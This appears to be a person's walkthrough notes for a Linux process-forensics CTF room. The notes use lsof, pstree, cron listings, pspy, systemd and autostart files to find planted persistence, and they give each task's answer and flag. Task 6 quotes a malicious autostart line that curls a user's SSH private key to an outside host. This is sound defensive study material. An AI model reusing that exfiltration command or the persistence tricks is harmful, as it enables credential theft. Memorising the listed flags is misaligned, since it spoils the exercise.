@@ -1,0 +1,121 @@
+Linux Process Analysis
+
+
+task 2
+export PATH=/mnt/usb/bin:/mnt/usb/sbin
+export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64
+
+check-env
+
+
+-
+task 3
+lsof means List Open Files.
+
+In Linux, many resources are represented through file descriptors, including regular files, directories, pipes and network sockets.
+
+lsof
+
+To investigate a particular user:
+lsof -u Janice
+
+
+ans: lsof
+
+
+2
+-
+
+Use pstree to list out the process hierarchies. What is the name of the nc process's parent?
+
+
+First, list all processes in hierarchical format:
+
+ps -eFH
+
+Now inspect the parent hierarchy:
+pstree -p -s 775
+
+or 
+pstree
+
+
+ans:abzkd83o4jakxld
+
+-
+
+task 4
+
+cat /etc/crontab
+
+ls -la /etc/cron.hourly/
+ls -la /etc/cron.daily/
+ls -la /etc/cron.weekly/
+ls -la /etc/cron.monthly/
+ls -la /etc/cron.d/
+
+cat /etc/cron.hourly/beacon
+ans: cat /etc/cron.hourly/beacon
+
+
+2
+-
+sudo ls -al /var/spool/cron/crontabs/
+
+sudo bash -c 'for user in $(cut -f1 -d: /etc/passwd); do entries=$(crontab -u "$user" -l 2>/dev/null | grep -v "^#"); if [ -n "$entries" ]; then echo "$user:"; echo "$entries"; echo; fi; done'
+
+ cat /home/elijah/.flag.sh 
+
+ans: THM{4682786cf2d92f01c4d30a2bbf4621f7}
+
+3
+-
+pspy64
+
+ /bin/echo -e VEhNezg1MWE5ODE0NDVkYmZiOTQ4NWMzNzcxNTEwYTUzNTY4fQ== 
+ echo "VEhNezg1MWE5ODE0NDVkYmZiOTQ4NWMzNzcxNTEwYTUzNTY4fQ==" | base64 -d
+
+ans:THM{851a981445dbfb9485c3771510a53568}
+
+
+task 5:
+
+sudo systemctl list-units --type=service --state=running --no-pager
+
+ans:
+ b4ckd00rftw.service                            loaded active running Backdoor Service - THM{4922066dc6494e8d4d507eef2205c262} 
+
+
+2
+-
+sudo journalctl -f -u b4ckd00rftw.service
+
+Nov 27 13:42:23 tryhackme b4ckd00rftw.sh[656]: THM{053c12e620acea8a77b4bdcba578ca19}
+
+
+task 6
+
+sudo ls -la /home/*/.config/autostart/
+sudo cat /home/janice/.config/autostart/keygrabber.desktop
+
+
+Exec=/bin/bash -c "curl -X POST -d '/home/janice/.ssh/id_rsa' http://aabab.best-it-services.thm/id_rsa"
+
+2
+-
+
+sudo grep '^Exec=' /home/franklin/.config/autostart/netwk.desktop
+
+ans: ifconfig
+
+
+task 7
+
+
+ cat /home/janice/.viminfo
+
+ans:THM{4a8fd984228d89999342d189e6b916de}
+
+2
+-
+sudo python3 /home/investigator/dumpzilla.py /home/eduardo/.mozilla/firefox/niijyovp.default-release --Bookmarks
